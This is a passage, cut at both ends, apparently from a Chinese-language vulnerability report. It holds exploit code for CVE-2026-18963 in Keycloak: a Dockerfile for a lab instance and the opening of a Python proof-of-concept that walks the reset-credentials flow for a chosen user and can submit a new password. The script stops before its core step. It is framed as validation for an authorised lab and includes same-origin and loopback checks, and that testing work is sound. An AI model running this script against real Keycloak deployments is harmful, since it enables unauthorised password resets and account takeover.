ty/cve/cve-2026-18963\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/1ae94b81e3cbb38d3bff81513a45c85b/Dockerfile\n---\nFROM quay.io/keycloak/keycloak:26.6.2\n\nENV KC_BOOTSTRAP_ADMIN_USERNAME=admin \\\n    KC_BOOTSTRAP_ADMIN_PASSWORD=admin-password-for-lab\n\nEXPOSE 8080\nCMD [\"start-dev\", \"--http-port=8080\"]\n\n\n---\n/tmp/1ae94b81e3cbb38d3bff81513a45c85b/Keycloak_CVE_2026_18963.py\n---\n#!/usr/bin/env python3\n\"\"\"CVE-2026-18963 validation/PoC for authorised lab use only.\"\"\"\n\nimport argparse\nimport html\nimport ipaddress\nimport re\nimport secrets\nimport sys\nfrom urllib.parse import urljoin, urlparse\n\nimport requests\nfrom bs4 import BeautifulSoup\n\n\ndef form_action(response, form_id):\n    form = BeautifulSoup(response.text, \"html.parser\").find(\"form\", id=form_id)\n    if not form or not form.get(\"action\"):\n        raise RuntimeError(f\"missing form #{form_id} at {response.url}\")\n    return urljoin(response.url, html.unescape(form[\"action\"]))\n\n\ndef same_origin(base, url):\n    if urlparse(base).netloc != urlparse(url).netloc:\n        raise RuntimeError(f\"refusing cross-origin form action: {url}\")\n    return url\n\n\ndef trace(label, response):\n    print(f\"[{label}] {response.status_code} {response.url}\")\n\n\ndef permit_loopback_http_cookies(session, base, enabled):\n    \"\"\"Permit Keycloak's Secure cookies over HTTP only for an explicit loopback lab.\"\"\"\n    parsed = urlparse(base)\n    if not enabled:\n        return\n    try:\n        loopback = ipaddress.ip_address(parsed.hostname).is_loopback\n    except ValueError:\n        loopback = parsed.hostname == \"localhost\"\n    if parsed.scheme != \"http\" or not loopback:\n        raise RuntimeError(\"--allow-loopback-http-cookie requires an http:// loopback URL\")\n    for cookie in session.cookies:\n        cookie.secure = False\n\n\ndef main():\n    ap = argparse.ArgumentParser(description=\"Validate CVE-2026-18963 against an authorised Keycloak lab\")\n    ap.add_argument(\"base_url\", help=\"Keycloak base URL, e.g. https://keycloak.lab\")\n    ap.add_argument(\"--realm\", default=\"master\")\n    ap.add_argument(\"--username\", required=True, help=\"Lab account whose reset flow will be tested\")\n    ap.add_argument(\"--new-password\", help=\"Generated when omitted\")\n    ap.add_argument(\"--timeout\", type=float, default=15)\n    ap.add_argument(\"--insecure\", action=\"store_true\", help=\"Disable TLS verification\")\n    ap.add_argument(\"--allow-loopback-http-cookie\", action=\"store_true\",\n                    help=\"Permit Secure auth cookies over HTTP for a loopback lab only\")\n    ap.add_argument(\"--change-password\", action=\"store_true\", help=\"Actually submit the new password\")\n    args = ap.parse_args()\n\n    base = args.base_url.rstrip(\"/\")\n    password = args.new_password or secrets.token_urlsafe(15)\n    s = requests.Session()\n    s.verify = not args.insecure\n    s.headers[\"User-Agent\"] = \"keycloak-cve-2026-18963-authorised-lab-poc/1.0\"\n\n    auth = f\"{base}/realms/{args.realm}/protocol/openid-connect/auth\"\n    params = {\n        \"client_id\": \"account\", \"response_type\": \"code\", \"scope\": \"openid\",\n        \"redirect_uri\": f\"{base}/realms/{args.realm}/account\"\n    }\n\n    try:\n        r = s.get(auth, params=params, timeout=args.timeout)\n        trace(\"1 auth\", r)\n        permit_loopback_http_cookies(s, base, args.allow_loopback_http_cookie)\n        soup = BeautifulSoup(r.text, \"html.parser\")\n        forgot = next((a.get(\"href\") for a in soup.find_all(\"a\") if \"reset-credentials\" in (a.get(\"href\") or \"\")), None)\n        if not forgot:\n            raise RuntimeError(\"Forgot Password/reset-credentials link not found\")\n        forgot_url = same_origin(base, urljoin(r.url, html.unescape(forgot)))\n\n        r = s.get(forgot_url, timeout=args.timeout)\n        trace(\"2 reset\", r)\n        permit_loopback_ht